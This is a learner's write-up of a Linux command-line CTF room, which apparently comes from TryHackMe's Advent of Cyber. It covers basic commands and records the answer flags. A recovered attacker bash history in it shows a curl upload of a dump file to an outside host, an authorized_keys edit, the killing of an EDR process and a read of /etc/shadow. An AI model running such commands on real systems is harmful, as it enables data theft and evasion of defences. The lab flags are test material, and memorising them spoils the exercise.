# Linux CLI - Shells Bells

## Task 1 (Introduction)
I was asked to start the virtual machine to begin the room.

### Steps I followed
1. I clicked on the Start button to launch the virtual machine  
2. I connected to it using the VM option provided in the room  
3. After connecting successfully, I was ready to continue with the tasks  



## Task 2 (Linux CLI)
In this task, I was introduced to basic Linux command line commands. These commands are very useful when working on Linux servers. I learned how to move between folders, list files, read files, and search for data.

### Steps I followed
1. First, I learned basic commands like `ls`, `cd`, `cat`, and `find`  
2. I also learned about common flags like `-la` used with `ls` to show hidden files  
3. I was asked to solve some small challenges on the virtual machine  

4. In the first challenge, I used `ls -la` to list all files  
5. Then I used `cat` to read the file and find the flag inside McSkidy’s guide  

6. In the second challenge, I had to find a script named eggstrike.sh  
7. I used `find /home -name *egg*` to locate the file  
8. After finding it, I used `cat` to read the script and get the flag  

9. In the third part, I learned about `sudo`  
10. I used `sudo su` to switch to the root user  
11. I checked another user’s bash history  
12. I read it using `cat /root/.bash_history`  
13. The history contained the flag  

### Commands Used
```bash
mcskidy@tbfc-web01:~$ sudo su
root@tbfc-web01:/home/mcskidy$ ls
Desktop    Guides    Public      Videos
Documents  Music     README.txt  snap
Downloads  Pictures  Templates

root@tbfc-web01:/home/mcskidy$ history
    1  whoami
    2  cd ~
    3  ll 
    4  nano .ssh/authorized_keys 
    5  curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
    6  curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
    7  curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
    8  pkill tbfcedr
    9  cat /etc/shadow
   10  cat /etc/hosts
```

### Answers
-   Which CLI command would you use to list a directory\
    `ls`
-   What flag did you see inside McSkidy's guide\
    `THM{learning-linux-cli}`
-   Which command helped you filter the logs for failed logins\
    `grep`
-   What flag did you see inside the Eggstrike script\
    `THM{sir-carrotbane-attacks}`